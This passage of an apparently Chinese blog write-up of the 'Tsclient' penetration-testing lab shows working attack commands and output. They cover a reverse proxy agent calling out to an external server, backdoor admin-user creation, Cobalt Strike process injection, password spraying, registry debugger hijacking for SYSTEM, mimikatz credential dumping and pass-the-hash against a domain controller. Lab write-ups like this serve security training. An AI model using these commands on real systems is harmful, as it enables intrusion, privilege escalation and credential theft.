class="line"><span class="string">172.22.8.46:139 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.18:139 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.15:139 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.31:135 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.46:135 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.15:135 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.18:135 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.46:80 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.18:80 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.15:88 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">[*] alive ports len is: 16</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.31</span></span><br><span class="line"><span class="string">   [-&gt;]WIN19-CLIENT</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.31</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.46</span></span><br><span class="line"><span class="string">   [-&gt;]WIN2016</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.46</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.18</span></span><br><span class="line"><span class="string">   [-&gt;]WIN-WEB</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.18</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.15</span></span><br><span class="line"><span class="string">   [-&gt;]DC01</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.15</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">已完�?16/16</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 10.0991565s</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>172.22.8.18 	已经拿下</li>
+<li>172.22.8.31	XIAORANG\WIN19-CLIENT </li>
+<li>172.22.8.46	WIN2016.xiaorang.lab</li>
+<li>172.22.8.15	DC XIAORANG\DC01</li>
+</ul>
+<p>然后搭建代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 2334 -s 123</span><br><span class="line"></span><br><span class="line">C:/迅雷下载/windows_x64_agent.exe -c 124.223.25.186:2334 -s 123 --reconnect 8</span><br><span class="line"></span><br><span class="line">use 0</span><br><span class="line">socks 3333</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+<p>然后物理机用proxifier搭建一下代理</p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><h3 id="RDP添加用户连接"><a href="#RDP添加用户连接" class="headerlink" title="RDP添加用户连接"></a>RDP添加用户连接</h3><p>c2中查看端口开放情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -no	//查看端口开放情况</span><br></pre></td></tr></table></figure>
+
+<p>意外发现有一个连接</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105203946686.png" alt="image-20251105203946686"></p>
+<p>另外看到3389端口是开着的，先add一个用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net user test1 whoami123! /add</span><br><span class="line">shell net localgroup administrators test1 /add</span><br></pre></td></tr></table></figure>
+
+<p>rdp连接上去</p>
+<p>然后查看一下用户信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line">query user</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105204710271.png" alt="image-20251105204710271"></p>
+<p>发现还有一个john并且还是管理员</p>
+<p>查看一下当前存活用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quser || qwinst</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105204818354.png" alt="image-20251105204818354"></p>
+<h3 id="CS进程注入"><a href="#CS进程注入" class="headerlink" title="CS进程注入"></a>CS进程注入</h3><p>既然存活，那我们可以尝试cs进程注入 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32445755/article/details/124349427">https://blog.csdn.net/qq_32445755/article/details/124349427</a></p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105212235948.png" alt="image-20251105212235948"></p>
+<p>打到这选修课下课了。。。急急忙忙回工作室发现网断了，干脆直接重开靶机去打了</p>
+<p>随便选择一个john的进程进行inject就行了</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105212615929.png" alt="image-20251105212615929"></p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105212710218.png" alt="image-20251105212710218"></p>
+<p>成功上线john</p>
+<p>用John查看共享资源 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105212845379.png" alt="image-20251105212845379"></p>
+<p>发现存在共享资源，读取一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> \\TSCLIENT\C</span><br><span class="line">shell <span class="built_in">type</span> \\TSCLIENT\C\credential.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到了一个域用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br></pre></td></tr></table></figure>
+
+<h3 id="密码喷洒攻击"><a href="#密码喷洒攻击" class="headerlink" title="密码喷洒攻击"></a>密码喷洒攻击</h3><p>密码喷洒攻击，用kali去打吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u <span class="string">&#x27;Aldrich&#x27;</span> -p <span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span></span><br><span class="line">SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.18     445    WIN-WEB          [-] WIN-WEB\Aldrich:Ald@rLMWuy7Z!# STATUS_LOGON_FAILURE </span><br><span class="line">SMB         172.22.8.46     445    WIN2016          [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED </span><br><span class="line">SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED </span><br><span class="line">SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED </span><br></pre></td></tr></table></figure>
+
+<p>要么登录失败要么过期，但是过期的话是可以更改密码的</p>
+<p>后面好几个都显示密码已过期，分别是DC01，WIN2016，WIN19-CLIENT三台主机，我们登录上去试一下</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105213403604.png" alt="image-20251105213403604"></p>
+<h3 id="impacket-changepasswd修改密码"><a href="#impacket-changepasswd修改密码" class="headerlink" title="impacket-changepasswd修改密码"></a>impacket-changepasswd修改密码</h3><p>需要修改密码，用impacket里面的脚本<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket%EF%BC%8C%E4%BD%86%E6%98%AF%E6%B2%A1%E6%89%BE%E5%88%B0%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%8F%91%E7%8E%B0kali%E6%9C%89%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B8%A6%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%90%8E%E9%9D%A2%E5%8F%91%E7%8E%B0%E5%8E%9F%E6%9D%A5%E6%98%AF%E8%84%9A%E6%9C%AC%E5%90%8D%E5%AD%97%E6%94%B9%E4%BA%86">https://github.com/fortra/impacket，但是没找到这个工具，不过发现kali有一个自带的工具，后面发现原来是脚本名字改了</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-changepasswd xiaorang.lab/Aldrich:<span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span>@172.22.8.15 -newpass <span class="string">&#x27;Whoami@666&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105213736342.png" alt="image-20251105213736342"></p>
+<p>但是测了一下只有<code>172.22.8.46:3389</code>是可以rdp上去的</p>
+<h3 id="不出网转发上线CS"><a href="#不出网转发上线CS" class="headerlink" title="不出网转发上线CS"></a><strong>不出网转发上线CS</strong></h3><p>但是是不出网的，需要用172.22.8.18转发cs上线</p>
+<p>给172.22.8.18添加监听器</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105214341195.png" alt="image-20251105214341195"></p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105214348717.png" alt="image-20251105214348717"></p>
+<p>远程桌面我们可以直接把本机的文件复制粘贴过去，所以生成完复制过去然后点一下即可上线</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105215438357.png" alt="image-20251105215438357"></p>
+<p>成功上线</p>
+<h3 id="进程劫持提权"><a href="#进程劫持提权" class="headerlink" title="进程劫持提权"></a>进程劫持提权</h3><p>无权限读取文件，需要映像劫持提权</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/321211.html%EF%BC%8C%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%B4%EF%BC%8C%E5%B0%B1%E6%98%AF%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E6%8C%87%E5%AE%9A%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9%E5%AE%9E%E7%8E%B0%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8A%AB%E6%8C%81%EF%BC%8C%E5%8D%B3%E8%BF%90%E8%A1%8C%E6%8C%87%E5%AE%9A%E7%A8%8B%E5%BA%8F%E5%AE%9E%E9%99%85%E4%B8%8A%E8%BF%90%E8%A1%8C%E7%9A%84%E6%98%AF%E6%88%91%E4%BB%AC%E8%87%AA%E5%B7%B1%E7%9A%84%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%E3%80%82">https://www.freebuf.com/articles/system/321211.html，简单的说，就是通过修改指定注册表项实现程序的劫持，即运行指定程序实际上运行的是我们自己的后门程序。</a></p>
+<p>原理<br>一个程序要被运行时，会先检查注册表，如果有指定程序并且开启了debugger，那么会优先执行debugger指定的程序，这样也就造成了映像劫持。</p>
+<p>先看一下注册表权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Acl -path <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | fl *</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105215623785.png" alt="image-20251105215623785"></p>
+<p>重点关注这个</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AccessToString          : CREATOR OWNER Allow  FullControl</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  SetValue, CreateSubKey, ReadKey</span><br><span class="line">                          NT AUTHORITY\SYSTEM Allow  FullControl</span><br><span class="line">                          BUILTIN\Administrators Allow  FullControl</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey</span><br></pre></td></tr></table></figure>
+
+<p>所有正常登录的用户都可以修改注册表，利用这个性质，修改注册表映像劫持，这里我使用放大镜进行提权，其实也就是把magnify.exe替换成C:\windows\system32\cmd.exe，这样就直接提权成system了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>锁定用户，再在右下角的放大镜打开就是system的cmd了</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105215849348.png" alt="image-20251105215849348"></p>
+<p>成功劫持并且用户是system高权限用户，我们直接读取flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105215956222.png" alt="image-20251105215956222"></p>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>还是一样，用system用户去执行我们的cs马子进行上线</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\Aldrich\Desktop</span><br><span class="line">beacon.exe</span><br></pre></td></tr></table></figure>
+
+<p>接下来进行一些域信息搜集</p>
+<p>查看域管成员，直接在system的cmd中传命令吧，在cs服务器中传太慢了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105220341598.png" alt="image-20251105220341598"></p>
+<h3 id="哈希传递"><a href="#哈希传递" class="headerlink" title="哈希传递"></a>哈希传递</h3><p>发现win2016$在域管组里，即机器账户可以Hash传递登录域控，所以相当于直接拿域控了。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ParrotSec/mimikatz">https://github.com/ParrotSec/mimikatz</a> 利用mimikatz进行hash传递攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\\Users\\Aldrich\\Desktop\\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105221340485.png" alt="image-20251105221340485"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords4ba974f170ab0fe1a8a1eb0ed8f6fe1a	//抓取到的哈希值</span><br></pre></td></tr></table></figure>
+
+<p>这里我们也可以使用CS来logonpasswords，得到域控的hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>然后进行哈希传递</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H 4ba974f170ab0fe1a8a1eb0ed8f6fe1a -d xiaorang -x <span class="string">&quot;whoami&quot;</span></span><br><span class="line">proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H 4ba974f170ab0fe1a8a1eb0ed8f6fe1a -d xiaorang -x <span class="string">&quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MDUT%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.1.</span> <span class="toc-text">MDUT连接数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9C%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">甜土豆提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C2%E4%B8%8A%E7%BA%BF%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.3.</span> <span class="toc-text">C2上线木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">4.</span> <span class="toc-text">flag2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RDP%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E8%BF%9E%E6%8E%A5"><span class="toc-number">4.1.</span> <span class="toc-text">RDP添加用户连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">CS进程注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BB"><span class="toc-number">4.3.</span> <span class="toc-text">密码喷洒攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#impacket-changepasswd%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">4.4.</span> <span class="toc-text">impacket-changepasswd修改密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BFCS"><span class="toc-number">4.5.</span> <span class="toc-text">不出网转发上线CS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-number">4.6.</span> <span class="toc-text">进程劫持提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">5.</span> <span class="toc-text">flag3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-number">5.1.</span> <span class="toc-text">哈希传递</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&text=春秋云镜Tsclient"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&title=春秋云镜Tsclient"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&is_video=false&description=春秋云镜Tsclient"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜Tsclient&body=Check out this article: https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&title=春秋云镜Tsclient"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&title=春秋云镜Tsclient"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&title=春秋云镜Tsclient"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&title=春秋云镜Tsclient"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&name=春秋云镜Tsclient&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&t=春秋云镜Tsclient"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
